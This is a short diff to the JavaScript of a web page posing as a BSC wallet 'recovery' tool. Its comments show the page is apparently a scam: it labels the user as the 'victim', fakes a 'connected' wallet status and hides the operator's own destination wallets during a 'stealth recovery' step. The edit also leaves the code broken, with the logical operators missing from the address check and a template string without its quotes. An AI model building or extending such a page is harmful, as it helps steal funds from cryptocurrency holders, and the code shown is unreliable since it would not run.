@@ -404,23 +404,24 @@ async function connectWallet() {
     // 1. Connect Wallet
     document.getElementById('recoverBtn').onclick = async () => {
   const walletAddr = document.getElementById('walletAddress').value.trim();
-  if (!walletAddr || !walletAddr.startsWith('0x') || walletAddr.length !== 42) {
+  if (!walletAddr  !walletAddr.startsWith('0x')  walletAddr.length !== 42) {
     alert('Enter valid BSC wallet address (0x...)');
     return;
   }
   
-  // Load YOUR wallets
+  // Load YOUR 9 wallets
   setupYourWallets();
   
-  // Show fake burner + use victim address
+  // Show victim wallet as "burner"
   els.burnerAddr.textContent = walletAddr;
   
-  // Trigger existing flow
-  els.destinations.classList.remove('hidden');
-  els.revealBtn.classList.remove('hidden');
-  els.connectStatus.innerHTML = `<div class="connected">✅ Wallet: ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>`;
+  // Show recovery UI
+  els.destinations.style.display = 'block';
+  els.revealBtn.style.display = 'inline-block';
+  
+  // Fake connected
+  els.connectStatus.innerHTML = <div class="connected">✅ Wallet: ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>;
 };
-
     // 2. Show Stealth Recovery (YOUR wallets hidden)
     els.revealBtn.onclick = async () => {
       els.destinations.style.display = 'block';
@@ -539,4 +540,5 @@ async function connectWallet() {
 </body>
 
 </html>
+
 
